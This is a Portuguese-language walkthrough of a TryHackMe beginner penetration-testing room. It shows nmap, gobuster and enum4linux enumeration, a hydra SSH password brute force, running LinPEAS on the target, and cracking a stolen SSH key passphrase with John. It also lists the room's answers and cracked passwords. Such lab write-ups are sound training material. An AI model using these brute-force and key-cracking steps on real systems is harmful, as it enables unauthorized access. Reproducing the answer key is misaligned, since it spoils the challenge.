# Introdução

Esta é uma room que possui uma máquina que permite praticar hacking de aplicativos da web e escalonamento de privilégios.
# Execução

## 1 - Web App Testing and Privilege Escalation 

Neste conjunto de tarefas, serão abordados/necessários:
- Força bruta
- Quebra de hash
- Enumeração de serviço
- Enumeração do Linux

### 1. **Portscan**:

```shell
┌──(root㉿kali)-[/tryhackme/rooms/basicpentest]
└─# export TARGET=10.10.229.84                                                  
                                                                                 
┌──(root㉿kali)-[/tryhackme/rooms/basicpentest]
└─# nmap -A -T5 -Pn -p- $TARGET -oA portscan -v
```
Portas abertas:
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7

O export é para não ter que ficar digitando o IP do host alvo, usar apenas a variável. Mais informações nos arquivos portscan gerados.

### 2. **Enumeração do diretórios e arquivos no servidor web**:

Utilizado o gobuster para enumerar diretórios e arquivos:

```shell
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 16 -x php,html,js,css,sh,txt,cgi,py -q -o gobuster.txt
```
Diretórios e arquivos encontrados: 
- http://10.10.229.84/index.html 
- http://10.10.229.84/development/
- http://10.10.229.84/development/dev.txt
- http://10.10.229.84/development/j.txt

A resposta da questão ***c*** é ***development***.

### 3. **Enumeração de informações do SMB**

Utilização do enum4linux:

```shell
enum4linux -a $TARGET | tee enum4linux.txt
```
Usuários encontrados:
```
User\kay (Local User)
User\jan (Local User)
```
A resposta da questão ***d*** é ***jan***.

A resposta da questão ***h*** é ***kay***.

### 4. **Brute force de senha**
Utilizada a aplicação hydra para brute force de senha para usuário jan.

```shell
hydra -t 16 -l jan -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -vV $TARGET ssh 
```
A senha encontrada foi ***armando***. Resposta da questão ***e***.

### 5. **Elevação de privilégios**

Primeiro, acessamos o host alvo via SSH com a senha descoberta com o hydra:

```shell
┌──(root㉿kali)-[/tryhackme/rooms/basicpentest]
└─# ssh jan@$TARGET
```
Confirmando se o usuário jan possui alguma permissão sudo:

```shell
jan@basic2:~$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on basic2.
```
Checando permissões no passwd e shadow:

```shell
jan@basic2:~$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1639 Apr 23  2018 /etc/passwd
jan@basic2:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1085 Apr 23  2018 /etc/shadow
```
Sem muita opção até aqui.

Recorrendo a script de avaliação de pontos possíveis de elevação de privilégios. Por exemplo, o [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/download/20220710/linpeas.sh). Após realizar o download no host atacante, enviar para o host alvo, usando scp.

```shell
scp linpeas.sh jan@$TARGET:/tmp  
```
Agora é só executar o script:

```shell
jan@basic2:~$ chmod +x /tmp/linpeas.sh 
jan@basic2:~$ /tmp/linpeas.sh | tee /tmp/linpeas.log
```

O LinPEAS encontrou uma chave privada do usuário kay com permissão de leitura para outros usuários. Copia-se o texto da chave e adiciona-se em um arquivo no host atacante, para tentar conectar via ssh com o usuário kay.

```shell
┌──(root㉿kali)-[/tryhackme/rooms/basicpentest]
└─# ssh -i ~/id_rsa kay@$TARGET
kay@10.10.194.79's password: 
```
Está protegido por senha!!!

É possível utilizar o ssh2john para gerar um arquivo de texto com um conteúdo que o John the ripper consigar ler para descobrir a senha:

```shell
┌──(root㉿kali)-[/tryhackme/rooms/basicpentest]
└─# ssh2john ~/id_rsa > hash_id_rsa.txt
```
Agora, só rodar o John the ripper usando a wordlist rockyou.txt:

```shell
┌──(root㉿kali)-[/tryhackme/rooms/basicpentest]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (/root/id_rsa)     
1g 0:00:00:00 DONE (2022-07-15 22:41) 11.11g/s 919288p/s 919288c/s 919288C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Senha da chave id_rsa encontrada: ***beeswax***

Agora é só conectar via ssh com usuário kay, quando for solicitada a passphrase, basta digitar ***beeswax***. No diretório home do usuário kay, existe um arquivo pass.bak, que corresponde a resposta da questão ***j***.

```shell
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Para resolver a room, não foi necessário elevar para root.

## Questões:

- a. ***Deploy the machine and connect to our network*** *Não há necessidade de resposta*

- b. ***Find the services exposed by the machine*** *Não há necessidade de resposta* 

Sobre a questãob ***b***, é necessário realizar um portscan com o nmap. Mais informações na seção de recon acima.

- c. ***What is the name of the hidden directory on the web server(enter name without /)?*** *development*

- d. ***What is the username?*** *jan*

- e. ***What is the password?*** *armando*

- f. ***What service do you use to access the server(answer in abbreviation in all caps)?*** *SSH*

- g. ***Enumerate the machine to find any vectors for privilege escalation***  *Não há necessidade de resposta*

- h. ***What is the name of the other user you found(all lower case)?*** *kay*

- i. ***If you have found another user, what can you do with this information?*** *Não há necessidade de resposta*

- j. ***What is the final password you obtain?***


